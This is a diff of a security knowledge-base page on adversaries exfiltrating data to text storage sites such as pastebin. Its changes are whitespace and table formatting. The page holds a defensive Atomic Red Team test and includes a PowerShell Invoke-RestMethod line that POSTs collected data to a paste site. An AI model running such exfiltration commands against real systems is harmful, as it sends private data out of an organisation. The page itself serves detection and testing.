@@ -50,7 +50,7 @@ severity_boost:
 
 ## High-Level Description
 
-Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information. 
+Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.
 
 Text storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.
 
@@ -79,7 +79,7 @@ The following tests are from [Atomic Red Team](https://github.com/redcanaryco/at
 
 ### Atomic Test 1: Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)
 
-This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             
+This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)  
 See https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it
 
 **Supported Platforms:** windows
@@ -97,7 +97,6 @@ $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
 Write-Host "Your paste URL: $response"
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -111,26 +110,24 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1021 Restrict Web-Based Content
-Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.
 
+Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.
 
 ## Detection
 
 ### Detection Strategy for Exfiltration to Text Storage Sites
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Exfiltration to Text Storage Sites technique applicable | Low | Exfiltration |
+| Finding                                                 | Severity | Impact       |
+| ------------------------------------------------------- | -------- | ------------ |
+| Exfiltration to Text Storage Sites technique applicable | Low      | Exfiltration |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
